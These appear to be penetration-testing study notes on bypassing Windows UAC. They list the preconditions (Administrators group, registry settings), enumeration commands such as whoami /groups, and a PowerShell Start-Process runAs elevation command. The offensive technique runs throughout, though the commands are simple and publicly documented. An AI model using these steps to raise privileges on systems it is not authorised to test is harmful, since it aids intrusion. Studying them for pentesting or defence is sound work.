# Living off the Land

## 01 - Enumerate

> [!IMPORTANT] Conditions
> 1. The user must be part of `BUILTIN\Administrators` local group.
> 2. The [[06 - Tactics & Techniques & Procedures Phases/F - Post Exploitation/0x00 - Discovery/Desktop/Windows/Host/0xG - RPC/Registry/Operating System/System/Manual/Living off the Land#^c27723|UAC level]] with a registry key `ConsentPromptBehaviorAdmin` must be set to  `0` if `EnableLUA` is enabled with a value of (`0x01`).

```
C:\> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                                    Type             SID          Attributes
============================================================= ================ ============ ==================================================
Everyone                                                      Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114    Group used for deny only
BUILTIN\Administrators                                        Alias            S-1-5-32-544 Group used for deny only
BUILTIN\Users                                                 Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
..[omitted]..
Mandatory Label\High Mandatory Level                          Label            S-1-16-12288
```

If it's part of the **Administrators Group** you can exploit it with the BypassUAC exploits.

```
C:\> net.exe localgroup %username%
```

## 02 - Exploit

A simple attempt is to **RunAs** a user with `Medium Mandatory Level`.

```
C:\> powershell.exe Start-Process cmd.exe -Verb runAs
```